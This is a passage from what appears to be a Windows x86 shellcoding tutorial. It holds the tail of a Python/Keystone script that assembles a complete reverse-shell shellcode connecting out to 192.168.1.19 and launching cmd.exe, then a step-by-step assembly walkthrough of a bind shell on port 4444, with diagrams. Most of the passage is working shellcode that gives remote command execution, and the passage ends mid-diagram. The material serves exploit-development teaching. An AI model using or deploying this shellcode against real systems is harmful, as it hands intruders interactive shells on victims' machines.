    "   jmp   compute_hash_again        ;"

    " compute_hash_finished:             "

    " find_function_compare:             "
    "   cmp   edx, [esp+0x24]           ;"
    "   jnz   find_function_loop        ;"
    "   mov   edx, [edi+0x24]           ;"
    "   add   edx, ebx                  ;"
    "   mov   cx,  [edx+2*ecx]          ;"
    "   mov   edx, [edi+0x1c]           ;"
    "   add   edx, ebx                  ;"
    "   mov   eax, [edx+4*ecx]          ;"
    "   add   eax, ebx                  ;"
    "   mov   [esp+0x1c], eax           ;"

    " find_function_finished:            "
    "   popad                           ;"
    "   ret                             ;"

    " resolve_symbols_kernel32:          "
    "   push  0x78b5b983                ;"  #   TerminateProcess hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x10], eax           ;"
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x14], eax           ;"
    "   push  0x16b3fe72                ;"  #   CreateProcessA hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x18], eax           ;"

    " load_ws2_32:                       "
    "   xor   eax, eax                  ;"
    "   mov   ax, 0x6c6c                ;"
    "   push  eax                       ;"
    "   push  0x642e3233                ;"
    "   push  0x5f327377                ;"
    "   push  esp                       ;"
    "   call dword ptr [ebp+0x14]       ;"

    " resolve_symbols_ws2_32:            "
    "   mov   ebx, eax                  ;"
    "   push  0x3bfcedcb                ;"  #   WSAStartup hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x1C], eax           ;"
    "   push  0xadf509d9                ;"  #   WSASocketA hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x20], eax           ;"
    "   push  0xb32dba0c                ;"  #   WSAConnect hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x24], eax           ;"

    " call_wsastartup:                   "
    "   mov   eax, esp                  ;"
    "   mov   cx, 0x590                 ;"
    "   sub   eax, ecx                  ;"
    "   push  eax                       ;"
    "   xor   eax, eax                  ;"
    "   mov   ax, 0x0202                ;"
    "   push  eax                       ;"
    "   call dword ptr [ebp+0x1C]       ;"

    " call_wsasocketa:                   "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   mov   al, 0x06                  ;"
    "   push  eax                       ;"
    "   sub   al, 0x05                  ;"
    "   push  eax                       ;"
    "   inc   eax                       ;"
    "   push  eax                       ;"
    "   call dword ptr [ebp+0x20]       ;"

    " call_wsaconnect:                   "
    "   mov   esi, eax                  ;"
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  0x1301a8c0                ;"  #   192.168.1.19
    "   mov   ax, 0xbb01                ;"
    "   shl   eax, 0x10                 ;"
    "   add   ax, 0x02                  ;"
    "   push  eax                       ;"
    "   push  esp                       ;"
    "   pop   edi                       ;"
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   add   al, 0x10                  ;"
    "   push  eax                       ;"
    "   push  edi                       ;"
    "   push  esi                       ;"
    "   call dword ptr [ebp+0x24]       ;"

    " create_startupinfoa:               "
    "   push  esi                       ;"  #   hStdError
    "   push  esi                       ;"  #   hStdOutput
    "   push  esi                       ;"  #   hStdInput
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   mov   al, 0x80                  ;"
    "   xor   ecx, ecx                  ;"
    "   mov   cx, 0x80                  ;"
    "   add   eax, ecx                  ;"  #   0x100 = STARTF_USESTDHANDLES
    "   push  eax                       ;"
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   mov   al, 0x44                  ;"
    "   push  eax                       ;"
    "   push  esp                       ;"
    "   pop   edi                       ;"

    " create_cmd_string:                 "
    "   mov   eax, 0xff9a879b           ;"
    "   neg   eax                       ;"  #   EAX = 00657865 = "exe\0"
    "   push  eax                       ;"
    "   push  0x2e646d63                ;"  #   "cmd."
    "   push  esp                       ;"
    "   pop   ebx                       ;"

    " call_createprocessa:               "
    "   mov   eax, esp                  ;"
    "   xor   ecx, ecx                  ;"
    "   mov   cx, 0x390                 ;"
    "   sub   eax, ecx                  ;"
    "   push  eax                       ;"  #   lpProcessInformation
    "   push  edi                       ;"  #   lpStartupInfo
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  #   lpCurrentDirectory
    "   push  eax                       ;"  #   lpEnvironment
    "   push  eax                       ;"  #   dwCreationFlags
    "   inc   eax                       ;"  #   TRUE
    "   push  eax                       ;"  #   bInheritHandles
    "   dec   eax                       ;"
    "   push  eax                       ;"  #   lpThreadAttributes
    "   push  eax                       ;"  #   lpProcessAttributes
    "   push  ebx                       ;"  #   lpCommandLine
    "   push  eax                       ;"  #   lpApplicationName
    "   call dword ptr [ebp+0x18]       ;"  #   CreateProcessA
)

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

shellcode = bytes(encoding)
shellcode_str = ''.join(f'\\x{b:02x}' for b in shellcode)
print(f"[+] Generated Shellcode: {shellcode_str}")
print(f"[+] Shellcode length: {len(shellcode)} bytes")
```

### PoC Video

The following video demonstrates the reverse shell shellcode connecting back to our listener and providing an interactive command prompt:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/reverse-shell-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: Reverse shell connecting back to attacker*

---
## 11. Bind Shell: Waiting for Connections

A **bind shell** is the mirror image of a reverse shell. Instead of connecting out, the shellcode opens a port on the target and waits for the attacker to connect in. This is useful when the target has no outbound filtering, or when the attacker can reach the target directly.

The bind shell introduces three new Winsock functions (`bind`, `listen`, `accept`), the `rep stosb` fast-zero technique, and a critical two-socket-handle distinction that trips up beginners.

### Step 1: Resolving kernel32.dll Functions

We need three functions from `kernel32.dll`:

**LoadLibraryA** `HMODULE LoadLibraryA(LPCSTR lpLibFileName)` Loads `ws2_32.dll` for networking. Hash: `0xec0e4e8e`.

**CreateProcessA** `BOOL CreateProcessA(...)` Spawns cmd.exe with stdio redirected to the client socket. Hash: `0x16b3fe72`.

**ExitProcess** `void ExitProcess(UINT uExitCode)` Cleanly exits the process when the shell session ends. Hash: `0x73e2d87e`. Unlike the reverse shell which used `TerminateProcess`, here we use `ExitProcess` for a cleaner shutdown.

```nasm
resolve_symbols_kernel32:
    push  0xec0e4e8e              ; LoadLibraryA hash
    call  dword ptr [ebp+0x04]    ; find_function
    mov   [ebp+0x10], eax         ; save LoadLibraryA

    push  0x16b3fe72              ; CreateProcessA hash
    call  dword ptr [ebp+0x04]    ; find_function
    mov   [ebp+0x14], eax         ; save CreateProcessA

    push  0x73e2d87e              ; ExitProcess hash
    call  dword ptr [ebp+0x04]    ; find_function
    mov   [ebp+0x18], eax         ; save ExitProcess
```

<div align="center"><svg viewBox="0 0 750 250" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1101" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1101"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1101" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1101" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="250" rx="10" fill="url(#bg_s1101)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1101)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1101)" font-weight="bold">Bind Shell: kernel32.dll API Resolution</text>
  <rect x="30" y="50" width="280" height="170" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="170" y="72" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">EBP Variable Table</text>
  <rect x="45" y="82" width="250" height="28" rx="5" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
  <text x="170" y="100" text-anchor="middle" fill="#8b949e" font-size="11">[ebp+0x04] = find_function</text>
  <rect x="45" y="116" width="250" height="35" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="170" y="131" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">[ebp+0x10] = LoadLibraryA</text>
  <text x="170" y="144" text-anchor="middle" fill="#8b949e" font-size="9">hash: 0xec0e4e8e</text>
  <rect x="45" y="157" width="250" height="35" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="170" y="172" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">[ebp+0x14] = CreateProcessA</text>
  <text x="170" y="185" text-anchor="middle" fill="#8b949e" font-size="9">hash: 0x16b3fe72</text>
  <rect x="45" y="198" width="250" height="28" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="170" y="216" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">[ebp+0x18] = ExitProcess (0x73e2d87e)</text>
  <rect x="380" y="80" width="330" height="130" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="545" y="105" text-anchor="middle" fill="#e0e7ff" font-size="12" font-weight="bold">vs. Reverse Shell</text>
  <text x="545" y="130" text-anchor="middle" fill="#ff3366" font-size="11">Reverse: TerminateProcess (forceful kill)</text>
  <text x="545" y="152" text-anchor="middle" fill="#00ff88" font-size="11">Bind: ExitProcess (clean shutdown)</text>
  <text x="545" y="178" text-anchor="middle" fill="#8b949e" font-size="10">ExitProcess runs DLL detach routines</text>
  <text x="545" y="195" text-anchor="middle" fill="#8b949e" font-size="10">TerminateProcess skips them entirely</text>
</svg></div>

*Figure 11.1 -- kernel32.dll resolution for the bind shell. ExitProcess replaces TerminateProcess for a cleaner exit.*

### Step 2: Loading ws2_32.dll via LoadLibraryA

Same technique as the reverse shell -- build `"ws2_32.dll"` on the stack and call `LoadLibraryA`:

```nasm
load_ws2_32_dll:
    xor   eax, eax               ; EAX = 0
    push  eax                     ; null terminator
    xor   eax, eax
    mov   ax, 0x6c6c              ; AX = "ll"
    push  eax                     ; push "ll\0\0"
    push  0x642e3233              ; push "32.d"
    push  0x5f327377              ; push "ws2_"
    mov   esi, esp                ; ESI -> "ws2_32.dll\0"
    push  esi                     ; push lpLibFileName
    call  dword ptr [ebp+0x10]    ; LoadLibraryA("ws2_32.dll")
```

### Step 3: Resolving ws2_32.dll Functions

The bind shell needs five functions from `ws2_32.dll` -- two more than the reverse shell:

**WSAStartup** Initializes Winsock. Hash: `0x3bfcedcb`.

**WSASocketA** Creates the listening TCP socket. Hash: `0xadf509d9`.

**bind** `int bind(SOCKET s, const struct sockaddr *addr, int namelen)` Assigns a local address and port to the socket. We bind to `0.0.0.0:4444` (all interfaces). Hash: `0xc7701aa4`.

**listen** `int listen(SOCKET s, int backlog)` Puts the socket into listening mode. Hash: `0xe92eada4`.

**accept** `SOCKET accept(SOCKET s, struct sockaddr *addr, int *addrlen)` Blocks until a client connects, then returns a **new socket handle** for the connection. Hash: `0x498649e5`.

```nasm
resolve_symbols_ws2_32_dll:
    mov   ebx, eax                ; EBX = ws2_32.dll base
    push  0x3bfcedcb              ; WSAStartup hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x1C], eax         ; save WSAStartup

    push  0xadf509d9              ; WSASocketA hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x20], eax         ; save WSASocketA

    push  0xc7701aa4              ; bind hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x24], eax         ; save bind

    push  0xe92eada4              ; listen hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x28], eax         ; save listen

    push  0x498649e5              ; accept hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x2C], eax         ; save accept
```

<div align="center"><svg viewBox="0 0 750 240" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1102" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1102"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1102" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="240" rx="10" fill="url(#bg_s1102)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1102)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1102)" font-weight="bold">ws2_32.dll API Resolution (5 functions)</text>
  <rect x="50" y="50" width="200" height="160" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="150" y="72" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">EBP Table (ws2_32)</text>
  <rect x="65" y="82" width="170" height="22" rx="4" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="150" y="97" text-anchor="middle" fill="#ff3366" font-size="10">[ebp+0x1C] = WSAStartup</text>
  <rect x="65" y="108" width="170" height="22" rx="4" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="150" y="123" text-anchor="middle" fill="#ff6b35" font-size="10">[ebp+0x20] = WSASocketA</text>
  <rect x="65" y="134" width="170" height="22" rx="4" fill="#0d1117" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="150" y="149" text-anchor="middle" fill="#00d4ff" font-size="10">[ebp+0x24] = bind</text>
  <rect x="65" y="160" width="170" height="22" rx="4" fill="#0d1117" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="150" y="175" text-anchor="middle" fill="#00d4ff" font-size="10">[ebp+0x28] = listen</text>
  <rect x="65" y="186" width="170" height="22" rx="4" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="150" y="201" text-anchor="middle" fill="#00ff88" font-size="10">[ebp+0x2C] = accept</text>
  <rect x="310" y="50" width="400" height="160" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="510" y="72" text-anchor="middle" fill="#e0e7ff" font-size="12" font-weight="bold">Bind Shell Call Sequence</text>
  <text x="510" y="95" text-anchor="middle" fill="#ff3366" font-size="11">1. WSAStartup(0x0202, &wsadata)</text>
  <text x="510" y="115" text-anchor="middle" fill="#ff6b35" font-size="11">2. WSASocketA(2, 1, 6, 0, 0, 0) -> listenSock</text>
  <text x="510" y="135" text-anchor="middle" fill="#00d4ff" font-size="11">3. bind(listenSock, &addr, 16) -> port 4444</text>
  <text x="510" y="155" text-anchor="middle" fill="#00d4ff" font-size="11">4. listen(listenSock, 1) -> start accepting</text>
  <text x="510" y="175" text-anchor="middle" fill="#00ff88" font-size="11">5. accept(listenSock, 0, 0) -> clientSock</text>
  <text x="510" y="198" text-anchor="middle" fill="#8b949e" font-size="10">accept() BLOCKS until attacker connects</text>
</svg></div>

*Figure 11.2 -- Five Winsock functions for the bind shell. The sequence bind -> listen -> accept replaces the single WSAConnect of the reverse shell.*

### Step 4: Calling WSAStartup

Initialize Winsock 2.2 -- same as the reverse shell:

```nasm
call_WSAStartup:
    xor   eax, eax               ; EAX = 0
    mov   ax, 0x0202              ; wVersionRequired = 2.2
    add   esp, 0xFFFFFE70         ; sub esp, 0x190 (avoids null bytes)
    push  esp                     ; push &wsadata
    push  eax                     ; push 0x0202
    call  dword ptr [ebp+0x1C]   ; WSAStartup(0x0202, &wsadata)
```

> The `add esp, 0xFFFFFE70` trick: instead of `sub esp, 0x190` which would contain a null byte, we add the two's complement. `0xFFFFFE70 + 0x190 = 0x100000000 = 0` (wraps), so this is mathematically equivalent.

### Step 5: Calling WSASocketA

Create the listening TCP socket. The returned handle is stored at `[ebp+0x34]` as `listenSock`:

```nasm
call_WSASocketA:
    xor   eax, eax               ; EAX = 0
    push  eax                     ; dwFlags = 0
    push  eax                     ; g = 0
    push  eax                     ; lpProtocolInfo = NULL
    mov   al, 0x06                ; IPPROTO_TCP = 6
    push  eax                     ; push protocol
    xor   eax, eax
    inc   eax                     ; EAX = 1 (SOCK_STREAM)
    push  eax                     ; push type
    inc   eax                     ; EAX = 2 (AF_INET)
    push  eax                     ; push af
    call  dword ptr [ebp+0x20]    ; WSASocketA(2, 1, 6, 0, 0, 0)
    mov   [ebp+0x34], eax         ; save listenSock
```

### Step 6: Building sockaddr_in and Calling bind

The `bind` function associates the socket with a local address and port. For a bind shell, we use `INADDR_ANY` (0.0.0.0) to listen on all interfaces, and port 4444 (`0x5C11` in network byte order).

Unlike the reverse shell which packed `sin_family` and `sin_port` into one DWORD with shift tricks, here we write each field individually using `mov word/dword` instructions:

```nasm
call_bind:
    xor   edx, edx               ; EDX = 0
    inc   edx                     ; EDX = 1
    inc   edx                     ; EDX = 2 (AF_INET)
    xor   esi, esi
    sub   esp, 0x10               ; allocate 16 bytes for sockaddr_in
    mov   esi, esp                ; ESI = &sockaddr_in
    xor   eax, eax
    mov   [esi+0x08], eax         ; sin_zero = 0
    mov   [esi+0x04], eax         ; sin_addr = 0.0.0.0 (INADDR_ANY)
    mov   ax, 0x5C11              ; port 4444 in network byte order
    mov   word ptr [esi+0x02], ax ; sin_port = 4444
    mov   word ptr [esi], dx      ; sin_family = AF_INET (2)
    xor   edx, edx
    mov   dl, 0x10                ; namelen = 16
    push  edx                     ; push namelen
    push  esi                     ; push &sockaddr_in
    push  dword ptr [ebp+0x34]    ; push listenSock
    call  dword ptr [ebp+0x24]    ; bind(listenSock, &addr, 16)
```

<div align="center"><svg viewBox="0 0 750 220" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1103" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1103"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1103" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="220" rx="10" fill="url(#bg_s1103)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1103)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1103)" font-weight="bold">Bind Shell sockaddr_in (port 4444)</text>
  <text x="110" y="58" text-anchor="middle" fill="#8b949e" font-size="10">Offset</text>
  <text x="250" y="58" text-anchor="middle" fill="#8b949e" font-size="10">Value</text>
  <text x="520" y="58" text-anchor="middle" fill="#8b949e" font-size="10">Field</text>
  <rect x="60" y="68" width="80" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="100" y="87" text-anchor="middle" fill="#00d4ff" font-size="11">+0x00</text>
  <rect x="160" y="68" width="200" height="30" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="260" y="87" text-anchor="middle" fill="#ff6b35" font-size="11">0x0002 (AF_INET)</text>
  <text x="520" y="87" text-anchor="middle" fill="#ff6b35" font-size="10">sin_family</text>
  <rect x="60" y="104" width="80" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="100" y="123" text-anchor="middle" fill="#00d4ff" font-size="11">+0x02</text>
  <rect x="160" y="104" width="200" height="30" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="260" y="123" text-anchor="middle" fill="#ff3366" font-size="11">0x5C11 (port 4444)</text>
  <text x="520" y="123" text-anchor="middle" fill="#ff3366" font-size="10">sin_port (network order)</text>
  <rect x="60" y="140" width="80" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="100" y="159" text-anchor="middle" fill="#00d4ff" font-size="11">+0x04</text>
  <rect x="160" y="140" width="200" height="30" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="260" y="159" text-anchor="middle" fill="#00ff88" font-size="11">0x00000000 (INADDR_ANY)</text>
  <text x="520" y="159" text-anchor="middle" fill="#00ff88" font-size="10">sin_addr = 0.0.0.0</text>
  <rect x="60" y="176" width="80" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="100" y="195" text-anchor="middle" fill="#00d4ff" font-size="11">+0x08</text>
  <rect x="160" y="176" width="200" height="30" rx="5" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
  <text x="260" y="195" text-anchor="middle" fill="#8b949e" font-size="11">0x00000000 (padding)</text>
  <text x="520" y="195" text-anchor="middle" fill="#8b949e" font-size="10">sin_zero</text>
</svg></div>

*Figure 11.3 -- sockaddr_in for the bind shell. INADDR_ANY (0.0.0.0) means the shell listens on every network interface. Port 4444 = 0x115C in little-endian, 0x5C11 in network byte order.*

### Step 7: Calling listen

`listen` puts the socket into passive mode, ready to accept connections. The `backlog` parameter (1) limits the queue to one pending connection:

```nasm
call_listen:
    xor   eax, eax               ; EAX = 0
    inc   eax                     ; EAX = 1 (backlog)
    push  eax                     ; push backlog = 1
    push  dword ptr [ebp+0x34]    ; push listenSock
    call  dword ptr [ebp+0x28]    ; listen(listenSock, 1)
```

### Step 8: Calling accept -- The Blocking Call

This is where the shellcode pauses and waits. `accept` blocks execution until an attacker connects to port 4444. When a connection arrives, it returns a **new socket handle** -- this is the `clientSock` that we must use for stdio redirection, **not** the original `listenSock`.

```nasm
call_accept:
    xor   eax, eax               ; EAX = 0
    push  eax                     ; addrlen = NULL
    push  eax                     ; addr = NULL
    push  dword ptr [ebp+0x34]    ; push listenSock
    call  dword ptr [ebp+0x2C]    ; accept(listenSock, NULL, NULL)
    mov   [ebp+0x38], eax         ; save clientSock (NEW handle!)
```

> **Critical:** `accept` returns a *new* socket descriptor for the connected client. The original `listenSock` at `[ebp+0x34]` stays in listening mode. All stdio redirection must use `clientSock` at `[ebp+0x38]`. Using the listening socket instead is a silent failure -- the shell appears to work but no data flows.

<div align="center"><svg viewBox="0 0 750 240" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1104" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1104"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1104" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1104" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="240" rx="10" fill="url(#bg_s1104)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1104)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1104)" font-weight="bold">Two Socket Handles -- The Critical Distinction</text>
  <rect x="40" y="55" width="300" height="80" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="190" y="78" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">listenSock [ebp+0x34]</text>
  <text x="190" y="98" text-anchor="middle" fill="#e0e7ff" font-size="11">Created by WSASocketA</text>
  <text x="190" y="118" text-anchor="middle" fill="#8b949e" font-size="10">Used for bind/listen/accept only</text>
  <line x1="340" y1="95" x2="395" y2="95" stroke="#00ff88" stroke-width="2" marker-end="url(#arr_s1104)"/>
  <text x="370" y="88" text-anchor="middle" fill="#00ff88" font-size="9">accept()</text>
  <rect x="400" y="55" width="310" height="80" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="555" y="78" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">clientSock [ebp+0x38]</text>
  <text x="555" y="98" text-anchor="middle" fill="#e0e7ff" font-size="11">Returned by accept()</text>
  <text x="555" y="118" text-anchor="middle" fill="#e0e7ff" font-size="11">This one goes into STARTUPINFOA!</text>
  <rect x="120" y="155" width="510" height="65" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5" stroke-dasharray="4,3"/>
  <text x="375" y="178" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">Common Bug: Using listenSock for stdio redirect</text>
  <text x="375" y="200" text-anchor="middle" fill="#e0e7ff" font-size="11">The shell spawns, but data goes nowhere. No error, just silence.</text>
</svg></div>

*Figure 11.4 -- The two socket handles. accept() returns a new handle for the connected client. Use clientSock for stdio, not listenSock.*

### Step 9: Zeroing STARTUPINFOA with rep stosb

Rather than pushing 17 individual zero DWORDs to build the 68-byte `STARTUPINFOA` structure, we use `rep stosb` -- a single instruction that writes AL (zero) to each byte at EDI, decrementing ECX until it reaches zero:

```nasm
zero_structs:
    xor   eax, eax               ; AL = 0 (value to write)
    xor   ecx, ecx
    mov   cl, 0x44                ; ECX = 68 bytes
    sub   esp, ecx                ; allocate 68 bytes on stack
    mov   edi, esp                ; EDI = start of buffer
    push  ecx                     ; save size (rep destroys ECX)
    rep   stosb                   ; zero 68 bytes: [EDI]=AL, EDI++, ECX--
    pop   ecx                     ; restore size
    sub   edi, ecx                ; reset EDI to start of buffer
```

<div align="center"><svg viewBox="0 0 750 200" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1105" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1105"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1105" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1105" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="200" rx="10" fill="url(#bg_s1105)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1105)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1105)" font-weight="bold">rep stosb: Fast Memory Zeroing</text>
  <text x="100" y="58" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Before</text>
  <rect x="30" y="68" width="28" height="28" rx="2" fill="#151b28" stroke="#ff3366" stroke-width="1"/>
  <text x="44" y="86" text-anchor="middle" fill="#ff3366" font-size="9">??</text>
  <rect x="62" y="68" width="28" height="28" rx="2" fill="#151b28" stroke="#ff3366" stroke-width="1"/>
  <text x="76" y="86" text-anchor="middle" fill="#ff3366" font-size="9">??</text>
  <rect x="94" y="68" width="28" height="28" rx="2" fill="#151b28" stroke="#ff3366" stroke-width="1"/>
  <text x="108" y="86" text-anchor="middle" fill="#ff3366" font-size="9">??</text>
  <rect x="126" y="68" width="28" height="28" rx="2" fill="#151b28" stroke="#ff3366" stroke-width="1"/>
  <text x="140" y="86" text-anchor="middle" fill="#ff3366" font-size="9">??</text>
  <text x="175" y="86" text-anchor="middle" fill="#8b949e" font-size="11">...</text>
  <text x="470" y="58" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">After (68 iterations)</text>
  <rect x="380" y="68" width="28" height="28" rx="2" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="394" y="86" text-anchor="middle" fill="#00ff88" font-size="9">00</text>
  <rect x="412" y="68" width="28" height="28" rx="2" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="426" y="86" text-anchor="middle" fill="#00ff88" font-size="9">00</text>
  <rect x="444" y="68" width="28" height="28" rx="2" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="458" y="86" text-anchor="middle" fill="#00ff88" font-size="9">00</text>
  <rect x="476" y="68" width="28" height="28" rx="2" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
